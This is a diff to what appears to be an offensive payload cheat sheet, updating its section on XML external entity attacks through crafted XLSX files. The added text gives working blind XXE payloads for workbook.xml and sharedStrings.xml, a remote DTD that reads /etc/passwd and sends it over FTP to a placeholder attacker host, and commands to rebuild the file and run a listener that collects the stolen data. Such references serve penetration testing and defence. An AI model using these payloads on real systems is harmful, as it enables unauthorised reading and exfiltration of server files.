@@ -503,60 +503,67 @@ GIF (experimental)
 
 ### XXE inside XLSX file
 
-Extract the excel file.
+Structure of the XLSX:
 
 ```
-$ mkdir XXE && cd XXE
-$ unzip ../XXE.xlsx
-Archive:  ../XXE.xlsx
-  inflating: xl/drawings/drawing1.xml
-  inflating: xl/worksheets/sheet1.xml
-  inflating: xl/worksheets/_rels/sheet1.xml.rels
-  inflating: xl/sharedStrings.xml
-  inflating: xl/styles.xml
-  inflating: xl/workbook.xml
-  inflating: xl/_rels/workbook.xml.rels
-  inflating: _rels/.rels
-  inflating: [Content_Types].xml
+$ 7z l xxe.xlsx
+[...]
+   Date      Time    Attr         Size   Compressed  Name
+------------------- ----- ------------ ------------  ------------------------
+2021-10-17 15:19:00 .....          578          223  _rels/.rels
+2021-10-17 15:19:00 .....          887          508  xl/workbook.xml
+2021-10-17 15:19:00 .....         4451          643  xl/styles.xml
+2021-10-17 15:19:00 .....         2042          899  xl/worksheets/sheet1.xml
+2021-10-17 15:19:00 .....          549          210  xl/_rels/workbook.xml.rels
+2021-10-17 15:19:00 .....          201          160  xl/sharedStrings.xml
+2021-10-17 15:19:00 .....          731          352  docProps/core.xml
+2021-10-17 15:19:00 .....          410          246  docProps/app.xml
+2021-10-17 15:19:00 .....         1367          345  [Content_Types].xml
+------------------- ----- ------------ ------------  ------------------------
+2021-10-17 15:19:00              11216         3586  9 files
+```
+
+Extract Excel file: `7z x -oXXE xxe.xlsx`
+
+Rebuild Excel file:
+
+```
+$ cd XXE
+$ 7z u ../xxe.xlsx *
 ```
 
 Add your blind XXE payload inside `xl/workbook.xml`.
 
 ```xml
-<xml...>
-<!DOCTYPE x [ <!ENTITY xxe SYSTEM "http://YOURCOLLABORATORID.burpcollaborator.net/"> ]>
-<x>&xxe;</x>
-<workbook...>
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE cdl [<!ELEMENT cdl ANY ><!ENTITY % asd SYSTEM "http://x.x.x.x:8000/xxe.dtd">%asd;%c;]>
+<cdl>&rrr;</cdl>
+<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
 ```
 
 Alternativly, add your payload in `xl/sharedStrings.xml`:
 
 ```xml
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
-<!DOCTYPE foo [ <!ELEMENT t ANY > <!ENTITY xxe SYSTEM "http://YOURCOLLABORATORID.burpcollaborator.net/"> ]>
-<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="10" uniqueCount="10"><si><t>&xxe;</t></si><si><t>testA2</t></si><si><t>testA3</t></si><si><t>testA4</t></si><si><t>testA5</t></si><si><t>testB1</t></si><si><t>testB2</t></si><si><t>testB3</t></si><si><t>testB4</t></si><si><t>testB5</t></si></sst>
+<!DOCTYPE cdl [<!ELEMENT t ANY ><!ENTITY % asd SYSTEM "http://x.x.x.x:8000/xxe.dtd">%asd;%c;]>
+<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="10" uniqueCount="10"><si><t>&rrr;</t></si><si><t>testA2</t></si><si><t>testA3</t></si><si><t>testA4</t></si><si><t>testA5</t></si><si><t>testB1</t></si><si><t>testB2</t></si><si><t>testB3</t></si><si><t>testB4</t></si><si><t>testB5</t></si></sst>
 ```
 
-Rebuild the Excel file.
+Using a remote DTD will save us the time to rebuild a document each time we want to retrieve a different file.
+Instead we build the document once and then change the DTD.
+And using FTP instead of HTTP allows to retrieve much larger files.
+
+`xxe.dtd`
+
+```xml
+<!ENTITY % d SYSTEM "file:///etc/passwd">
+<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://x.x.x.x:2121/%d;'>"> 
+```
+
+Serve DTD and receive FTP payload using [xxeserv](https://github.com/staaldraad/xxeserv):
 
 ```
-$ zip -r ../poc.xlsx *
-updating: [Content_Types].xml (deflated 71%)
-updating: _rels/ (stored 0%)
-updating: _rels/.rels (deflated 60%)
-updating: docProps/ (stored 0%)
-updating: docProps/app.xml (deflated 51%)
-updating: docProps/core.xml (deflated 50%)
-updating: xl/ (stored 0%)
-updating: xl/workbook.xml (deflated 56%)
-updating: xl/worksheets/ (stored 0%)
-updating: xl/worksheets/sheet1.xml (deflated 53%)
-updating: xl/styles.xml (deflated 60%)
-updating: xl/theme/ (stored 0%)
-updating: xl/theme/theme1.xml (deflated 80%)
-updating: xl/_rels/ (stored 0%)
-updating: xl/_rels/workbook.xml.rels (deflated 66%)
-updating: xl/sharedStrings.xml (deflated 17%)
+$ xxeserv -o files.log -p 2121 -w -wd public -wp 8000
 ```
 
 ### XXE inside DTD file
